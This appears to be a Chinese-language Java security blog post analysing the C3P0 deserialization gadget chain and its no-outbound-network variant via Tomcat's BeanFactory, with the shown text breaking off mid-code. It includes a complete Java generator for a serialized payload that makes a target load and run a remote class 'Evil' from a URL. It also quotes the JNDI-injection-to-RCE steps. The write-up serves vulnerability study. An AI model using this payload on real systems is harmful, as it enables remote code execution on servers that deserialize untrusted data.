# Java安全-C3P0
## 简述
c3p0是用于创建和管理连接，利用“池”的方式复用连接减少资源开销，和其他数据源一样，也具有连接数控制、连接可靠性测试、连接泄露控制、缓存语句等功能。
## 原生反序列化利用
### 远程加载类
看一下YSO的利用链：
看起来像jndi注入。
先分析吧。
#### 利用链分析
`PoolBackedDataSourceBase`实现了`IdentityTokenized`
接口，此接口用于支持注册功能。每个DataSource实例都有一个identityToken，用于在C3P0Registry中注册。
还持有PropertyChangeSupport和VetoableChangeSupport对象，并提供了添加和移除监听器的方法
该类在序列化时需要存储对象的 `connectionPoolDataSource`
属性，该属性是`ConnectionPoolDataSource`接口对象。
如果属性不是可序列化的，就使用`com.mchange.v2.naming.ReferenceIndirector#indirectForm`
调用`(Referenceable)`对象的`getReference` 方法获取`Reference`对象，然后
生成一个可序列化的`IndirectlySerialized`对象。
也就是内置类`com.mchange.v2.naming.ReferenceIndirector.ReferenceSerialized#ReferenceSerialized`
在反序列化时，会把他读出来，
如果他是继承于`IndirectlySerialized`类的，就会调用对象的`getObject`方法重新生成`connectionPoolDataSouce`对象。本来以为这里存在JNDI注入，
但发现这里的`contextName`不可控，这里暂且能控制的只有`reference`属性，所以这个利用链应该是存在问题的。而且跟他下面的代码也对应不起来。
跟进`ReferenceableUtils.*referenceToObject*`
从这里可以看到，从Reference对象中拿出`classFactory classFactoryLocation`
属性，然后使用`URLClassLoader` 从`classFactoryLocation`中加载`classFactory`类。
#### 构造Payload
创建一个实现了 `Referenceable` 和
`ConnectionPoolDataSource`两个接口的类，但不能实现`Serializable`。
这个类其实并不会影响后面的反序列化，因为在序列化时，这个类的对象已经被封装成了`ReferenceSerialized` 对象，
后续也是使用的他的`getReference` 方法获取的`Reference` 对象，关键就是`getReference`方法。
    package com.c3p0;
    import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import javax.naming.Referenceable;
    import javax.sql.ConnectionPoolDataSource;
    import javax.sql.PooledConnection;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectOutputStream;
    import java.io.PrintWriter;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.sql.SQLException;
    import java.sql.SQLFeatureNotSupportedException;
    import java.util.Base64;
    import java.util.logging.Logger;
    public class c3p0SerDemo {
        private static class ConnectionPool implements ConnectionPoolDataSource , Referenceable{
            protected String classFactory = null;
            protected String classFactoryLocation = null;
            public ConnectionPool(String classFactory,String classFactoryLocation){
                this.classFactory = classFactory;
                this.classFactoryLocation = classFactoryLocation;
            }
            @Override
            public Reference getReference() throws NamingException {
                return new Reference("ref",classFactory,classFactoryLocation);
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
        public static void main(String[] args) throws Exception{
            Constructor constructor = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase").getDeclaredConstructor();
            constructor.setAccessible(true);
            PoolBackedDataSourceBase obj = (PoolBackedDataSourceBase) constructor.newInstance();
            ConnectionPool connectionPool = new ConnectionPool("Evil","http://127.0.0.1:8888/");
            Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            field.setAccessible(true);
            field.set(obj, connectionPool);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(obj);
            objectOutputStream.close();
            System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
        }
    }
### 不出网利用
参考雨了个雨师傅的文章。
还是`com.mchange.v2.naming.ReferenceableUtils#referenceToObject` 方法，
    public static Object referenceToObject( Reference ref, Name name, Context nameCtx, Hashtable env)
        throws NamingException
        {
        try
            {
            ……
            else
                {
                URL u = new URL( fClassLocation );
                cl = new URLClassLoader( new URL[] { u }, defaultClassLoader );
                }
            Class fClass = Class.forName( fClassName, true, cl );
            ObjectFactory of = (ObjectFactory) fClass.newInstance();
            return of.getObjectInstance( ref, name, nameCtx, env );
如果不使用`URLClassLoader`加载类的话，就需要加载并实例化本地实现了`ObjectFactory`
接口的类，并调用`getObjectInstance` 方法，这个方法在JNDI注入中有提到。
回顾一下JNDI注入的原理
> 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；  
>  攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；
>
> 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；
>
>
> 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；
>
> 攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；
在JDK8u191后出现了`trustCodebaseURL`的限制，无法加载远程`codebase`下的字节码，其中一种绕过是打本地的Gadgets，后来又出现一种就是找到一个本地可以利用`ObjectFactory`
类，因为后面会对他实例化并调用`getObjectInstance`方法。
原作者提出的是在 Tomcat 依赖里的`org.apache.naming.factory.BeanFactory` 类。
可以跟进看一下
    @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                        Hashtable environment)
            throws NamingException {
            if (obj instanceof ResourceRef) {
                try {
                    Reference ref = (Reference) obj;
                    String beanClassName = ref.getClassName();
                    Class beanClass = null;
                    ClassLoader tcl =
                        Thread.currentThread().getContextClassLoader();
                    if (tcl != null) {
                        try {
                            beanClass = tcl.loadClass(beanClassName);
                        ……
                    } else {
                        try {
                            beanClass = Class.forName(beanClassName);
                        ……
                    }
                        ……
                    Object bean = beanClass.getConstructor().newInstance();
                    /* Look for properties with explicitly configured setter */
                    RefAddr ra = ref.get("forceString");
                    Map forced = new HashMap<>();
                    String value;
                    if (ra != null) {
                        value = (String)ra.getContent();
                        Class paramTypes[] = new Class[1];
                        paramTypes[0] = String.class;
                        String setterName;
                        int index;
                        /* Items are given as comma separated list */
                        for (String param: value.split(",")) {
                            param = param.trim();
                            /* A single item can either be of the form name=method
                             * or just a property name (and we will use a standard
                             * setter) */
                            index = param.indexOf('=');
                            if (index >= 0) {
                                setterName = param.substring(index + 1).trim();
                                param = param.substring(0, index).trim();
                            } else {
                                ……
                            }
                            try {
                                forced.put(param,
                                           beanClass.getMethod(setterName, paramTypes));
                            } catch (NoSuchMethodException|SecurityException ex) {
                                ……
                            }